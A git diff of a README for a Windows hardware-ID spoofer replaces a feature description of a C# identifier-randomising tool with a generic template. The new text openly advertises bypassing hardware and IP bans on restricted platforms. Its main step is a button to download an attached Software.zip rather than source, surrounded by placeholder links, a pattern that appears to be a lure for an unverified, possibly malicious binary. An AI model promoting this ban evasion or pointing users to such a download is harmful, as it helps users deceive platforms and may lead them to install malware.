@@ -1,102 +1,66 @@
-<div align="center">
+# Spoofer-Hwid-Game
+![Spoofer-Hwid-Game Banner](https://bannerimage.com)
 
-# Hwid Spoofer
-
-Hwid Spoofer is a C# application that allows you to change various system identifiers on your Windows computer. This application helps you randomly change some system identifiers on your system.
-
-## Features
-
-- **HWID Change**: Generates and change a random HWID.
-
-- **PC GUID Change**: Generates and change a random PC GUID.
-
-- **Computer Name Change**: Generates and change a random computer name.
-
-- **Product ID Change**: Generates and change a random product ID.
-
-- **MAC Address Change (Beta)**: Assigns a random MAC address to a specific network interface.
-
-- **All Change**: Randomly changes all system identifiers and the MAC address.
-
-- **Backup Functionality**: The application provides a backup function to store the original values of system identifiers before changes are made, making it easier to revert to the original settings if needed.
-
-## Requirements
-- Visual Studio 2022 (.NET Desktop)
-
-
-## Build
-
-
-https://github.com/MuckPro/bunned/assets/138373919/a91a5c05-a2d5-498d-a4cd-bcceea474d9a
-
-
-# Preview
-
-![Console GUI](https://github.com/MuckPro/bunned/assets/138373919/cb342480-8cc1-40ef-92be-e13b582b34ae)
-
-
-
-## Usage
-
-1. Run the application and choose whether you want to change system identifiers randomly (Yes/No).
-
-
-2. If you select "Yes," you can choose which system identifier(s) you want to change:
-   - Hardware ID (HWID)
-   - PC GUID
-   - Computer Name
-   - Product ID
-   - MAC Address
-   - All of the above
-
-
-3. The application will guide you through the process of changing the selected system identifier(s).
-
-4. After the changes are made, the application will display the result.
-
-## Resourcs
-
-- [Source for Generating Random HWID](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-diskdrive)
-- [Source for Generating Random PC GUID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Computer Name](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Product ID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Changing MAC Address](https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.networkinterface)
-
-
-
-## Contribution
-
-This project is open-source, and contributions are welcome. If you'd like to contribute by adding features, fixing bugs, or improving the documentation, feel free to create a pull request.
-
-
-## License
-
-This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE) file.
+## Description
+This custom-created Hardware ID Spoofer is designed to bypass hardware or IP bans, allowing users to regain access to restricted platforms. It effectively changes the unique identifiers of a device, ensuring anonymity and continued usage despite previous bans.
 
 ---
 
+**Table of Contents**
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
+---
 
+## Installation
+To begin using the HWID spoofer, follow these steps:
 
+1. Clone the repository to your local machine using the command:
+```bash
+git clone https://github.com/your-username/Spoofer-Hwid-Game.git
+```
 
-<!---------------------------------------------------------------------------------------
+2. Download the necessary software package by clicking the button below:
+[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/17676726/Software.zip)
 
+### System Requirements
+- Operating System: Windows 10/8/7
+- RAM: 4GB or higher
+- Storage: 100MB available space
 
+---
 
+## Usage
+1. Open the software and navigate to the settings tab.
+2. Input the desired new hardware ID that you wish to spoof.
+3. Click the "Spoof" button to apply the changes.
+4. Restart your system for the changes to take effect.
 
+![HWID Spoofer Demo](https://demogif.com)
 
-                                         ░█████╗░██╗░░░██╗████████╗██╗░░██╗░█████╗░██████╗░
-                                         ██╔══██╗██║░░░██║╚══██╔══╝██║░░██║██╔══██╗██╔══██╗
-                                         ███████║██║░░░██║░░░██║░░░███████║██║░░██║██████╔╝
-                                         ██╔══██║██║░░░██║░░░██║░░░██╔══██║██║░░██║██╔══██╗
-                                         ██║░░██║╚██████╔╝░░░██║░░░██║░░██║╚█████╔╝██║░░██║
-                                         ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-                                                                                        
-                                                 █▀█ ▄▀█ ▀█▀ █░█ ▄▀█ █▀▀ █░░ ▀▄▀ ▀█▀
-                                                 █▀▄ █▀█ ░█░ █▀█ █▀█ ██▄ █▄▄ █░█ ░█░
+---
 
+## Contributing
+We welcome contributions from the community to improve and enhance the functionality of the HWID spoofer. To contribute, follow these steps:
 
+1. Fork the repository
+2. Create a new branch
+3. Make your changes
+4. Commit your changes
+5. Push to the branch
+6. Create a pull request
 
+---
 
+## License
+MIT License
 
------------------------------------------------------------------------------------------>
+---
+
+Feel free to reach out to us at [support@spooferhwidgame.com](mailto:support@spooferhwidgame.com) for any queries or support.
+
+Thank you for using the Spoofer-Hwid-Game repository! 🚀
+
+![Thumbs Up Emoji](https://emoji.com/thumbs-up)
